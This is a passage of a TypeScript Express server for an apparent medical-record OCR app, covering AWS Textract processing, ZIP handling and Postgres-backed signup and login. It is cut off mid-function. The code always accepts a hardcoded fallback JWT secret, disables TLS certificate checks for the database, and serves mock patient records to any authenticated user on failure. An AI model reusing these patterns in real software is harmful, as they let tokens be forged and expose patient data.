import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import { randomUUID } from "crypto";
import pg from "pg";
import dotenv from "dotenv";
import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import multer from "multer";
import * as pdfParse from "pdf-parse";
import { S3Client, PutObjectCommand } from "@aws-sdk/client-s3";
import { TextractClient, DetectDocumentTextCommand, StartDocumentTextDetectionCommand, GetDocumentTextDetectionCommand } from "@aws-sdk/client-textract";
import yauzl from "yauzl";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const envFiles = [
  path.resolve(__dirname, ".env.local"),
  path.resolve(__dirname, ".env"),
];

for (const envPath of envFiles) {
  const result = dotenv.config({ path: envPath });
  if (result.error && (result.error as NodeJS.ErrnoException).code !== "ENOENT") {
    console.warn(`Failed loading environment file ${envPath}:`, result.error);
  }
}

const JWT_SECRET = process.env.JWT_SECRET || "fallback-secret-for-dev";

const { Pool } = pg;

async function startServer() {
  try {
    const app = express();
    const portFromEnv = Number(process.env.PORT || 3000);

    async function getPortOrNextFree(startPort: number) {
      return new Promise<number>((resolve) => {
        const tryListen = (portToTry: number) => {
          const tester = app.listen(portToTry, "0.0.0.0", () => {
            tester.close(() => resolve(portToTry));
          });
          tester.on("error", (err: any) => {
            if (err && err.code === "EADDRINUSE") {
              tryListen(portToTry + 1);
              return;
            }
            console.error("Failed to acquire a listening port:", err);
            // If something else goes wrong, fallback to the original port.
            resolve(startPort);
          });
        };
        tryListen(startPort);
      });
    }

    const PORT = await getPortOrNextFree(portFromEnv);

    app.use(express.json({ limit: "5mb" }));

  // Simple logging middleware
  app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
    next();
  });

  const upload = multer({ storage: multer.memoryStorage() });

  const awsCredentials = process.env.AWS_ACCESS_KEY_ID && process.env.AWS_SECRET_ACCESS_KEY ? {
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
    sessionToken: process.env.AWS_SESSION_TOKEN,
  } : undefined;

  const S3_BUCKET = process.env.AWS_S3_BUCKET || "tasmia-textract-files";
  const s3Region = process.env.AWS_S3_BUCKET_REGION || process.env.AWS_REGION || "us-east-1";
  const requestedTextractRegion = process.env.AWS_TEXTRACT_REGION || process.env.AWS_REGION || "us-east-1";

  const supportedTextractRegions = [
    "us-east-1",
    "us-east-2",
    "us-west-2",
    "eu-west-1",
    "eu-central-1",
    "eu-north-1",
    "ap-south-1",
    "ap-northeast-1",
    "ap-southeast-1",
  ];

  const textractRegion = supportedTextractRegions.includes(requestedTextractRegion)
    ? requestedTextractRegion
    : "us-east-1";

  if (requestedTextractRegion !== textractRegion) {
    console.warn(`Requested Textract region ${requestedTextractRegion} is not in the supported list; falling back to ${textractRegion}`);
  }

  let textractClient = new TextractClient({
    region: textractRegion,
    credentials: awsCredentials,
  });

  const s3Client = S3_BUCKET ? new S3Client({
    region: s3Region,
    credentials: awsCredentials,
  }) : null;

  const parsePdf = (pdfParse as any).default || pdfParse;

  const OCR_SPELLING_CORRECTIONS: Array<[RegExp, string]> = [
    [/\bdischarege\b/gi, 'discharge'],
    [/\bmedcation\b/gi, 'medication'],
    [/\bmedicaton\b/gi, 'medication'],
    [/\btreament\b/gi, 'treatment'],
    [/\bprocdure\b/gi, 'procedure'],
    [/\bprocedre\b/gi, 'procedure'],
    [/\bpatietn\b/gi, 'patient'],
    [/\bpnuemonia\b/gi, 'pneumonia'],
    [/\bpnumonia\b/gi, 'pneumonia'],
    [/\bhypertensoin\b/gi, 'hypertension'],
    [/\bdiabtes\b/gi, 'diabetes'],
    [/\brespitory\b/gi, 'respiratory'],
    [/\boxgyen\b/gi, 'oxygen'],
    [/\badmisson\b/gi, 'admission'],
    [/\btempreature\b/gi, 'temperature'],
    [/\bcardiacc\b/gi, 'cardiac'],
  ];

  function normalizeOcrLineText(text: string) {
    let normalized = String(text ?? '').replace(/\s+/g, ' ').trim();
    if (!normalized) return '';

    // 1) Fix common OCR spelling mistakes early.
    normalized = OCR_SPELLING_CORRECTIONS.reduce(
      (value, [pattern, replacement]) => value.replace(pattern, replacement),
      normalized
    );

    // 2) Remove redundant document headers/footers that commonly appear in scanned clinical PDFs.
    //    Keep this conservative: only strip when the line looks like an institutional stamp/header.
    const headerLike =
      /(\btop\b[\s._-]*part\b|\bprinted\b|\bmedical\s*college\b|\bcollege\b|\bhospital\b|\bdepartment\b|\bregistration\b)/i.test(
        normalized
      );

    // If the line contains header-like keywords AND does NOT look like clinical content,
    // strip the line.
    const looksClinical = /(\b(diagnosis|treatment|medication|procedure|admission|discharge|death|patient|mrn|icd|lab|wbc|hgb|plt|vital|blood pressure|heart rate|temperature|x-ray|ct|mri|symptom)\b)/i.test(
      normalized
    );

    if (headerLike && !looksClinical) {
      // Also handle partial OCR fragments: reduce to empty so downstream joins skip it.
      return '';
    }

    return normalized;
  }

  async function uploadBufferToS3(buffer: Buffer, bucket: string, key: string, contentType: string) {
    if (!s3Client) {
      throw new Error("S3 client is not initialized");
    }
    await s3Client.send(new PutObjectCommand({
      Bucket: bucket,
      Key: key,
      Body: buffer,
      ContentType: contentType,
    }));
  }

  const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

  function isTextractThrottleError(err: any) {
    const name = String(err?.name || err?.Code || err?.code || '');
    const message = String(err?.message || err || '');
    return /throttl|too\s*many|rate|provisioned|limit/i.test(`${name} ${message}`);
  }

  async function sendTextractCommand(command: any) {
    const maxAttempts = 7;

    for (let attempt = 1; attempt <= maxAttempts; attempt += 1) {
      try {
        return await textractClient.send(command);
      } catch (err: any) {
      const message = String(err?.message || err);
      if (message.includes("ENOTFOUND") || message.includes("getaddrinfo") || message.includes("UnknownEndpoint")) {
        const fallbackRegions = supportedTextractRegions.filter((region) => region !== textractRegion);
        for (const fallbackRegion of fallbackRegions) {
          try {
            console.warn(`Textract region ${textractRegion} failed, retrying in ${fallbackRegion}`);
            textractClient = new TextractClient({
              region: fallbackRegion,
              credentials: awsCredentials,
            });
            return await textractClient.send(command);
          } catch (fallbackErr: any) {
            const fallbackMessage = String(fallbackErr?.message || fallbackErr);
            if (!fallbackMessage.includes("ENOTFOUND") && !fallbackMessage.includes("getaddrinfo") && !fallbackMessage.includes("UnknownEndpoint")) {
              throw fallbackErr;
            }
          }
        }
        throw new Error(`Textract endpoint lookup failed for region ${textractRegion} and all fallback regions.`);
      }

      if (isTextractThrottleError(err) && attempt < maxAttempts) {
        const waitMs = Math.min(30_000, 1_500 * 2 ** (attempt - 1)) + Math.floor(Math.random() * 750);
        console.warn(`Textract throttled (${message}). Retrying in ${Math.round(waitMs / 1000)}s; attempt ${attempt + 1}/${maxAttempts}.`);
        await sleep(waitMs);
        continue;
      }

      throw err;
    }
    }

    throw new Error("Textract request failed after retry attempts.");
  }

  async function getTextractTextBlocksForJob(jobId: string) {
    let nextToken: string | undefined;
    const allBlocks: any[] = [];

    while (true) {
      const response: any = await sendTextractCommand(new GetDocumentTextDetectionCommand({
        JobId: jobId,
        NextToken: nextToken,
      }));

      const status = response.JobStatus;
      if (response.Blocks) {
        allBlocks.push(...response.Blocks);
      }

      if (status === "SUCCEEDED") {
        nextToken = response.NextToken;
        if (!nextToken) {
          break;
        }
        continue;
      }

      if (status === "FAILED") {
        throw new Error(response.StatusMessage || "Textract async PDF job failed.");
      }

      if (status === "IN_PROGRESS" || status === "PARTIAL_SUCCESS") {
        await new Promise((resolve) => setTimeout(resolve, 2000));
        nextToken = response.NextToken;
        continue;
      }

      throw new Error(`Unexpected Textract job status: ${status}`);
    }

    return allBlocks;
  }

  async function processZipFile(buffer: Buffer) {
    return new Promise<{ pages: any[]; fullText: string; blocks: any[] }>((resolve, reject) => {
      yauzl.fromBuffer(buffer, { lazyEntries: true }, (err, zipfile) => {
        if (err) {
          return reject(new Error(`Failed to open ZIP file: ${err.message}`));
        }

        const allPages: any[] = [];
        const allBlocks: any[] = [];
        let fullText = '';
        let foundSupportedFile = false;

        zipfile.on('entry', (entry) => {
          if (/\/$/.test(entry.fileName)) {
            // Directory entry, skip
            zipfile.readEntry();
            return;
          }

          // Check if file is supported
          const fileName = entry.fileName.toLowerCase();
          const isSupported = fileName.endsWith('.pdf') || 
                            fileName.endsWith('.png') || 
                            fileName.endsWith('.jpg') || 
                            fileName.endsWith('.jpeg') || 
                            fileName.endsWith('.tiff') || 
                            fileName.endsWith('.tif');

          if (!isSupported) {
            zipfile.readEntry();
            return;
          }

          foundSupportedFile = true;
          zipfile.openReadStream(entry, (err, readStream) => {
            if (err) {
              console.error(`Error opening ${entry.fileName}:`, err);
              zipfile.readEntry();
              return;
            }

            const chunks: Buffer[] = [];
            readStream.on('data', (chunk) => chunks.push(chunk));
            readStream.on('end', async () => {
              try {
                const fileBuffer = Buffer.concat(chunks);
                const mimeType = fileName.endsWith('.pdf') ? 'application/pdf' : 
                               fileName.endsWith('.png') ? 'image/png' :
                               fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') ? 'image/jpeg' :
                               'image/tiff';

                const result = await processIndividualFile(fileBuffer, mimeType);
                
                // Add file name to pages
                result.pages.forEach(page => {
                  (page as any).fileName = entry.fileName;
                  allPages.push(page);
                });
                
                allBlocks.push(...result.blocks);
                fullText += `\n\n--- ${entry.fileName} ---\n${result.fullText}`;
                
              } catch (fileErr) {
                console.error(`Error processing ${entry.fileName}:`, fileErr);
              }
              zipfile.readEntry();
            });
          });
        });

        zipfile.on('end', () => {
          if (!foundSupportedFile) {
            resolve({ pages: [], fullText: 'No supported files found in ZIP archive.', blocks: [] });
            return;
          }

          resolve({ pages: allPages, fullText: fullText.trim(), blocks: allBlocks });
        });

        zipfile.readEntry();
      });
    });
  }

  async function processIndividualFile(buffer: Buffer, mimeType: string) {
    console.log(`Processing file with mimeType: ${mimeType}`);
    const supportedImageTypes = ['image/png', 'image/jpeg', 'image/jpg', 'image/tiff', 'image/tif'];
    const isPdf = mimeType === "application/pdf";
    const isSupportedImage = supportedImageTypes.includes(mimeType);

    if (!isPdf && !isSupportedImage) {
      throw new Error(`Unsupported file type: ${mimeType}. Supported formats: PDF, PNG, JPEG, TIFF.`);
    }

    if (isPdf) {
      const useAsyncPdf = Boolean(S3_BUCKET && s3Client && textractRegion === s3Region);
      if (useAsyncPdf) {
        let blocks: any[] = [];
        try {
          const objectKey = `textract-inputs/${Date.now()}-${randomUUID()}.pdf`;
          await uploadBufferToS3(buffer, S3_BUCKET, objectKey, mimeType);

          const startResponse: any = await sendTextractCommand(new StartDocumentTextDetectionCommand({
            DocumentLocation: {
              S3Object: {
                Bucket: S3_BUCKET,
                Name: objectKey,
              },
            },
          }));

          const jobId = startResponse.JobId;
          if (!jobId) {
            throw new Error("AWS Textract did not return a JobId for PDF processing.");
          }

          blocks = await getTextractTextBlocksForJob(jobId);
        } catch (s3OrTextractError: any) {
          console.error("S3/Textract error:", s3OrTextractError);
          throw new Error(`AWS service error: ${s3OrTextractError.message || s3OrTextractError}`);
        }

        const pagesMap = new Map<number, { page: number; lines: Array<{ lineRef: string; text: string }>; words: Array<{ wordRef: string; text: string; confidence: number | null }> }>();
        const wordCounters = new Map<number, number>();
        const lineCounters = new Map<number, number>();

        blocks.forEach(block => {
          const page = block.Page ?? 1;
          if (!pagesMap.has(page)) {
            pagesMap.set(page, { page, lines: [], words: [] });
            wordCounters.set(page, 0);
            lineCounters.set(page, 0);
          }

          const pageData = pagesMap.get(page)!;

          if (block.BlockType === "WORD" && block.Text) {
            const currentIndex = (wordCounters.get(page) ?? 0) + 1;
            wordCounters.set(page, currentIndex);
            pageData.words.push({
              wordRef: `P${page}-W${currentIndex}`,
              text: block.Text,
              confidence: typeof block.Confidence === 'number' ? block.Confidence : null,
            });
          }

          if (block.BlockType === "LINE" && block.Text) {
            const text = normalizeOcrLineText(block.Text);
            if (!text) return;

            const currentIndex = (lineCounters.get(page) ?? 0) + 1;
            lineCounters.set(page, currentIndex);
            pageData.lines.push({
              lineRef: `P${page}-L${currentIndex}`,
              text,
            });
          }
        });

        const pages = Array.from(pagesMap.values()).sort((a, b) => a.page - b.page);
        const fullText = pages
          .map(page => `Page ${page.page}:\n${page.lines.map((line: any) => `${line.lineRef}: ${line.text}`).join('\n')}`)
          .join('\n\n');

        return { pages, fullText, blocks };
      }

      console.warn("Async Textract PDF is disabled because Textract region and S3 bucket region differ. Falling back to local PDF parsing.");
      const pdfData = await parsePdf(buffer);
      const text = pdfData.text || "";
      const lines = text.split(/\r?\n/).map((line: string) => normalizeOcrLineText(line)).filter((line: string) => line.length > 0);

      return {
        pages: [
          {
            page: 1,
            lines: lines.map((line: string, index: number) => ({ lineRef: `P1-L${index + 1}`, text: line })),
            words: [],
          },
        ],
        fullText: lines.join('\n'),
        blocks: [],
      };
    }

    const params = {
      Document: {
        Bytes: buffer,
      },
    };

    const command = new DetectDocumentTextCommand(params);

    const response: any = await sendTextractCommand(command);
    const blocks = response.Blocks || [];

    const pagesMap = new Map<number, { page: number; lines: Array<{ lineRef: string; text: string }>; words: Array<{ wordRef: string; text: string; confidence: number | null }> }>();

    const wordCounters = new Map<number, number>();
    const lineCounters = new Map<number, number>();

        blocks.forEach((block: any) => {
      const page = block.Page ?? 1;
      if (!pagesMap.has(page)) {
        pagesMap.set(page, { page, lines: [], words: [] });
        wordCounters.set(page, 0);
        lineCounters.set(page, 0);
      }

      const pageData = pagesMap.get(page)!;

      if (block.BlockType === "WORD" && block.Text) {
        const currentIndex = (wordCounters.get(page) ?? 0) + 1;
        wordCounters.set(page, currentIndex);
        pageData.words.push({
          wordRef: `P${page}-W${currentIndex}`,
          text: block.Text,
          confidence: typeof block.Confidence === 'number' ? block.Confidence : null,
        });
      }

      if (block.BlockType === "LINE" && block.Text) {
        const currentIndex = (lineCounters.get(page) ?? 0) + 1;
        lineCounters.set(page, currentIndex);
        pageData.lines.push({
          lineRef: `P${page}-L${currentIndex}`,
          text: normalizeOcrLineText(block.Text),
        });
      }
    });

    const pages = Array.from(pagesMap.values()).sort((a, b) => a.page - b.page);
    const fullText = pages
          .map(page => `Page ${page.page}:\n${page.lines.map((line: any) => `${line.lineRef}: ${line.text}`).join('\n')}`)
      .join('\n\n');

    return { pages, fullText, blocks };
  }

  async function extractTextFromBuffer(buffer: Buffer, mimeType: string) {
    const isZip = mimeType === "application/zip" || mimeType === "application/x-zip-compressed";
    
    if (isZip) {
      return await processZipFile(buffer);
    } else {
      return await processIndividualFile(buffer, mimeType);
    }
  }

  async function mapWithConcurrency<T, R>(
    items: T[],
    limit: number,
    mapper: (item: T, index: number) => Promise<R>
  ): Promise<R[]> {
    const results = new Array<R>(items.length);
    let nextIndex = 0;

    const workers = Array.from({ length: Math.min(limit, items.length) }, async () => {
      while (nextIndex < items.length) {
        const currentIndex = nextIndex;
        nextIndex += 1;
        results[currentIndex] = await mapper(items[currentIndex], currentIndex);
      }
    });

    await Promise.all(workers);
    return results;
  }

  app.post("/api/ocr", upload.array("files"), async (req: any, res) => {
    const files = req.files as any[];
    if (!files || files.length === 0) {
      return res.status(400).json({ error: "File upload required" });
    }

    if (!process.env.AWS_ACCESS_KEY_ID || !process.env.AWS_SECRET_ACCESS_KEY) {
      return res.status(500).json({ error: "Missing AWS credentials: AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY must be set." });
    }

    try {
      const OCR_CONCURRENCY = Math.max(1, Number(process.env.OCR_CONCURRENCY || 2));
      const results = await mapWithConcurrency(files, OCR_CONCURRENCY, async (file) => {
        try {
          console.log(`File: ${file.originalname}, mimetype: ${file.mimetype}`);
          const result = await extractTextFromBuffer(file.buffer, file.mimetype || "application/octet-stream");
          return {
            fileName: file.originalname,
            pages: result.pages,
            text: result.fullText,
          };
        } catch (fileErr: any) {
          console.error(`Error processing ${file.originalname}:`, fileErr.message);
          return {
            fileName: file.originalname,
            error: fileErr.message,
          };
        }
      });
      res.json(results);
    } catch (err: any) {
      console.error("Textract OCR error:", {
        name: err?.name,
        message: err?.message,
        stack: err?.stack,
        details: err,
      });
      res.status(500).json({
        error: `AWS Textract extraction failed: ${err?.message || String(err)}`,
      });
    }
  });

  function withNeonSslParams(connectionString: string): string {
    // Ensure Neon-required SSL params exist even if user provided DATABASE_URL without them.
    const hasSslMode = /([?&])sslmode=/.test(connectionString);
    const hasChannelBinding = /([?&])channel_binding=/.test(connectionString);
    const hasUseLibpqCompat = /([?&])uselibpqcompat=/.test(connectionString);

    if (hasSslMode && hasChannelBinding && hasUseLibpqCompat) return connectionString;

    const sep = connectionString.includes("?") ? "&" : "?";
    const sslModePart = hasSslMode ? "" : "sslmode=require";
    const channelPart = hasChannelBinding ? "" : "channel_binding=require";
    const libpqCompatPart = hasUseLibpqCompat ? "" : "uselibpqcompat=true";

    const parts = [sslModePart, channelPart, libpqCompatPart].filter(Boolean);
    return connectionString + sep + parts.join("&");
  }

  const rawDatabaseUrl = process.env.DATABASE_URL || "";
  const databaseUrl = rawDatabaseUrl ? withNeonSslParams(rawDatabaseUrl) : "";

  // Log host + flags (no secrets)
  try {
    if (databaseUrl) {
      const withoutCreds = databaseUrl.replace(/\/\/[^@/]+@/, "//***@");
      console.log("Database URL (sanitized):", withoutCreds);
      console.log("Neon SSL params present:",
        /([?&])sslmode=require/.test(databaseUrl) && /([?&])channel_binding=require/.test(databaseUrl)
      );
    } else {
      console.warn("DATABASE_URL is not configured; using in-memory fallback storage.");
    }
  } catch {
    // ignore logging errors
  }

  const createPool = () =>
    new Pool({
      connectionString: databaseUrl,
      connectionTimeoutMillis: 5000,
      // Keep Node TLS permissive; Neon requires SSL but can handle cert verification
      // via libpq params. The critical piece here is using libpq-compatible SSL semantics.
      ssl: {
        rejectUnauthorized: false,
      },
    });

  let pool: any = databaseUrl ? createPool() : null;

  // In-memory fallback stores
  let mockPatients = [
    { id: '1', name: 'Sarah Johnson', age: '62', mrn: 'MRN-2024-7832', admission_date: '2026-04-20', status: 'Stable', color: 'blue' },
    { id: '2', name: 'Michael Chen', age: '45', mrn: 'MRN-2024-7801', admission_date: '2026-04-18', status: 'Observation', color: 'orange' },
    { id: '3', name: 'Emily Rodriguez', age: '31', mrn: 'MRN-2024-7789', admission_date: '2026-04-15', status: 'Stable', color: 'green' },
    { id: '4', name: 'David Kim', age: '54', mrn: 'MRN-2024-7765', admission_date: '2026-04-12', status: 'Discharged', color: 'zinc' },
  ];
  let mockCases: any[] = [];
  let mockUsers: Array<{ id: string; email: string; password: string; display_name?: string; photo_url?: string }> = [];
  let useFallback = false;

  // DB DNS/backoff state so we don't spam retries on ENOTFOUND.
  let dbUnavailableUntil = 0; // epoch ms
  const DB_DNS_COOLDOWN_MS = 30_000;

  // Initialize DB tables if they don't exist with retry logic for Neon cold starts
  // Important: do NOT permanently lock the app into fallback mode. If DB recovers later,
  // we should flip back to Postgres so auth endpoints work again.
  async function initDb(retries = 3) {
    console.log("Starting database initialization...");
    if (!databaseUrl || !pool) {
      useFallback = true;
      console.warn("Skipping database initialization because DATABASE_URL is not configured.");
      return;
    }

    while (true) {
      const now = Date.now();
      if (now < dbUnavailableUntil) {
        const waitMs = dbUnavailableUntil - now;
        await new Promise((resolve) => setTimeout(resolve, Math.min(waitMs, 10_000)));
        continue;
      }

      try {
        // Test connection first
        await pool.query("SELECT 1");


        await pool.query(`
          CREATE TABLE IF NOT EXISTS users (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            email TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            display_name TEXT,
            photo_url TEXT,
            created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
          );

          CREATE TABLE IF NOT EXISTS patients (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            owner_id UUID REFERENCES users(id),
            name TEXT NOT NULL,
            age TEXT,
            mrn TEXT UNIQUE NOT NULL,
            admission_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'Stable',
            color TEXT DEFAULT 'blue',
            last_updated TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
          );

          CREATE TABLE IF NOT EXISTS cases (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            patient_id UUID REFERENCES patients(id),
            owner_id UUID REFERENCES users(id),
            workflow_status TEXT DEFAULT 'pending_ingest',
            risk_score INTEGER,
            alerts JSONB DEFAULT '[]',
            timeline JSONB DEFAULT '[]',
            findings JSONB DEFAULT '[]',
            transcript JSONB DEFAULT '[]',
            summary TEXT,
            created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
          );

          ALTER TABLE IF EXISTS cases ADD COLUMN IF NOT EXISTS transcript JSONB DEFAULT '[]';
          ALTER TABLE IF EXISTS cases ADD COLUMN IF NOT EXISTS summary TEXT;
        `);

        console.log("Database initialized successfully");
        useFallback = false;
        return;
      } catch (err) {
        const msg = err instanceof Error ? err.message : String(err);
        console.error(`Database initialization failed: ${msg}`);

        const looksLikeDnsFailure =
          msg.includes("ENOTFOUND") ||
          msg.includes("getaddrinfo") ||
          msg.toLowerCase().includes("no address associated") ||
          msg.includes("UnknownEndpoint") ||
          msg.includes("EAI_AGAIN") ||
          msg.includes("ENETUNREACH");

        if (looksLikeDnsFailure) {
          console.error("DB DNS failure detected; switching to fallback auth/storage immediately.");

          // Close existing pool connections so pg stops reusing any internal state.
          try {
            await pool.end().catch(() => undefined);
          } catch {
            // ignore
          }
          pool = createPool();

          useFallback = true;
          // Cooldown so we don't spam DNS failures.
          dbUnavailableUntil = Date.now() + DB_DNS_COOLDOWN_MS;
          continue;
        }


        // Try a few quick retries before waiting longer.
        for (let i = 0; i < retries; i++) {
          try {
            console.log(`Retrying DB connection (${i + 1}/${retries}) in 3 seconds...`);
            await new Promise(resolve => setTimeout(resolve, 3000));
            await pool.query("SELECT 1");
            // If SELECT 1 works, the outer try will re-run table creation.
            break;
          } catch {
            // keep looping until outer try succeeds
          }
        }

        console.log("Database still unavailable; enabling fallback mode temporarily.");
        useFallback = true;
        // Wait before re-attempting table init
        await new Promise(resolve => setTimeout(resolve, 5000));
      }
    }
  }

  // API Routes
  let dbInitPromise: Promise<void> | null = null;

  // Ensure signup/login can reliably await DB initialization (tables + schema) before inserts.
  dbInitPromise = initDb();

  app.post("/api/auth/signup", async (req, res) => {
    let { email, password, displayName } = req.body;

    if (dbInitPromise) {
      try {
        await dbInitPromise;
      } catch {
        useFallback = true;
      }
    }

    if (!email || !password) {
      return res.status(400).json({ error: "Email and password are required" });
    }
    email = email.toLowerCase().trim();

    if (useFallback || !pool) {
      const existing = mockUsers.find((u) => u.email.toLowerCase() === email.toLowerCase());
      if (existing) {
        return res.status(400).json({ error: "Email already registered" });
      }

      const user = {
        id: randomUUID(),
        email,
        password: await bcrypt.hash(password, 10),
        display_name: displayName ?? null,
        photo_url: `https://api.dicebear.com/7.x/avataaars/svg?seed=${email}`,
      };

      mockUsers.push(user);
      const token = jwt.sign({ userId: user.id }, JWT_SECRET);
      return res.json({ user: { id: user.id, email: user.email, display_name: user.display_name, photo_url: user.photo_url }, token });
    }

    try {
      const hashedPassword = await bcrypt.hash(password, 10);
      const photoUrl = `https://api.dicebear.com/7.x/avataaars/svg?seed=${email}`;

      const insertUser = async () => {
        return await pool.query(
          "INSERT INTO users (email, password, display_name, photo_url) VALUES ($1, $2, $3, $4) RETURNING id, email, display_name, photo_url",
          [email, hashedPassword, displayName, photoUrl]
        );
      };

      let result: any;
      const maxAttempts = 3;
      for (let attempt = 1; attempt <= maxAttempts; attempt++) {
        try {
          result = await insertUser();
          break;
        } catch (err: any) {
          if (err?.code === "23505") {
            // Unique violation
            return res.status(400).json({ error: "Email already registered" });
          }

          if (attempt === maxAttempts) throw err;

          console.warn(`Signup DB insert failed (attempt ${attempt}/${maxAttempts}):`, err?.message || err);
          await new Promise((resolve) => setTimeout(resolve, attempt * 1000));
        }
      }

      const user = result.rows[0];
      const token = jwt.sign({ userId: user.id }, JWT_SECRET);
      res.json({ user, token });
    } catch (err: any) {
      // If Neon/Postgres DNS is down, fall back to in-memory auth so signup still works.
      // This prevents "register" from being blocked by transient infrastructure issues.
      if (err?.code === "ENOTFOUND") {
        const existing = mockUsers.find((u) => u.email.toLowerCase() === email.toLowerCase());
        if (existing) {
          return res.status(400).json({ error: "Email already registered" });
        }

        const userId = randomUUID ? randomUUID() : String(Date.now()) + "-" + Math.random().toString(36).slice(2);
        const user = {
          id: userId,
          email,
          password: await bcrypt.hash(password, 10),
          display_name: displayName ?? null,
          photo_url: `https://api.dicebear.com/7.x/avataaars/svg?seed=${email}`,
        };

        mockUsers.push(user);
        const token = jwt.sign({ userId: user.id }, JWT_SECRET);
        return res.json({ user: { id: user.id, email: user.email, display_name: user.display_name, photo_url: user.photo_url }, token });
      }

      console.error("Signup error:", err);
      res.status(500).json({ error: "Registration failed" });
    }
  });

  app.post("/api/auth/login", async (req, res) => {
    let { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: "Email and password are required" });
    }
    email = email.toLowerCase().trim();

    // If DB is unavailable, authenticate against the in-memory fallback users.
    if (useFallback) {
      const existing = mockUsers.find((u) => u.email.toLowerCase() === email);
      if (!existing) {
        return res.status(401).json({ error: "Invalid credentials" });
      }
      const ok = await bcrypt.compare(password, existing.password);
      if (!ok) {
        return res.status(401).json({ error: "Invalid credentials" });
      }

      const token = jwt.sign({ userId: existing.id }, JWT_SECRET);
      return res.json({
        user: {
          id: existing.id,
          email: existing.email,
          display_name: existing.display_name ?? null,
          photo_url: existing.photo_url ?? null,
        },
        token,
      });
    }

    try {
      const result = await pool.query("SELECT * FROM users WHERE email = $1", [email]);
      const user = result.rows[0];
      if (!user || !(await bcrypt.compare(password, user.password))) {
        return res.status(401).json({ error: "Invalid credentials" });
      }
      const token = jwt.sign({ userId: user.id }, JWT_SECRET);
      const { password: _, ...userWithoutPassword } = user;
      res.json({ user: userWithoutPassword, token });
    } catch (err: any) {
      console.error("Login error:", err);

      // If Neon/Postgres is down, transparently switch to fallback auth.
      if (err?.code === "ENOTFOUND" || err?.message?.includes("ENOTFOUND") || err?.message?.includes("getaddrinfo")) {
        useFallback = true;
        // Re-run login using fallback store.
        const existing = mockUsers.find((u) => u.email.toLowerCase() === email);
        if (!existing) {
          return res.status(401).json({ error: "Invalid credentials" });
        }
        const ok = await bcrypt.compare(password, existing.password);
        if (!ok) {
          return res.status(401).json({ error: "Invalid credentials" });
        }

        const token = jwt.sign({ userId: existing.id }, JWT_SECRET);
        return res.json({
          user: {
            id: existing.id,
            email: existing.email,
            display_name: existing.display_name ?? null,
            photo_url: existing.photo_url ?? null,
          },
          token,
        });
      }


      res.status(500).json({ error: "Login failed" });
    }
  });


  // Auth Middleware
  const authenticateToken = (req: any, res: any, next: any) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.sendStatus(401);

    // Support both the current secret and the legacy dev fallback secret
    // to prevent stale tokens breaking fallback mode.
    const secretsToTry = [JWT_SECRET, "fallback-secret-for-dev"].filter(
      (v, i, arr) => typeof v === "string" && arr.indexOf(v) === i
    );

    for (const secret of secretsToTry) {
      const verifyResult = jwt.verify(token, secret);
      if (verifyResult && typeof verifyResult === "object" && "userId" in verifyResult) {
        req.userId = (verifyResult as any).userId;
        return next();
      }
    }

    return res.sendStatus(403);
  };

  app.get("/api/patients", authenticateToken, async (req: any, res) => {
    if (useFallback) {
      return res.json(mockPatients);
    }
    try {
      const result = await pool.query("SELECT * FROM patients WHERE owner_id = $1 ORDER BY name ASC", [req.userId]);
      res.json(result.rows);
    } catch (err) {
      useFallback = true;
      res.json(mockPatients);
    }
  });

  const parsePatientFromTranscript = (transcript: string): { name?: string; age?: string; sex?: string; mrn?: string } => {
    const text = String(transcript ?? ' ').replace(/\s+/g, ' ').trim();

    const matchName =
      text.match(/(?:Name\s*:|Patient\s*Name\s*:)([^|,;]+?)(?=\s*(?:Age|Sex|MRN|I\.P\.|IP No\.|Hospital No\.|Admission|$))/i) ||
      text.match(/(?:Name)\s*[:\-]\s*([A-Za-z][A-Za-z .'-]{1,60})/i);

    const matchAge =
      text.match(/(?:Age\s*:)([^|,;]+?)(?=\s*(?:Sex|MRN|I\.P\.|IP No\.|Hospital No\.|Admission|$))/i) ||
      text.match(/(?:Age)\s*[:\-]\s*([0-9/.-]{1,20})/i);

    const matchSex =
      text.match(/(?:Sex\s*:|Sex\s+)([FM]{1})/i) ||
      text.match(/\bSex\b\s*[:\-]?\s*(Male|Female)\b/i);

    const matchMrn =
      text.match(/(?:MRN\s*:|MRN\s+)([^|,;]+?)(?=\s*(?:Age|Sex|Name|Admission|$))/i) ||
      text.match(/(?:I\.P\. No\.|IP No\.|I\.P\.|IP)\s*[:\-]?\s*([0-9]{3,20})/i) ||
      text.match(/(?:Hospital No\.|Hospital\s*No\.|Hospital)\s*[:\-]?\s*([0-9]{3,20})/i);

    const normalize = (v?: string) => (v ? String(v).replace(/\s+/g, ' ').trim() : undefined);

    const cleanupOcrLineRef = (v?: string) =>
      v
        ? v
            .replace(/\bP\d+-L\d+\s*:\s*/gi, '') // e.g. "Fesha P1-L8:"
            .replace(/\bP\d+-L\d+\b/gi, '')     // e.g. "Fesha P1-L8"
            .replace(/[0-9]+\s*$/g, match => match) // keep trailing numbers if they are part of name; no-op safeguard
        : undefined;

    const name = cleanupOcrLineRef(normalize(matchName?.[1]));
    const age = normalize(matchAge?.[1]);
    const sexRaw = normalize(matchSex?.[1]);
    const mrn = normalize(matchMrn?.[1]);

    const sex =
      sexRaw
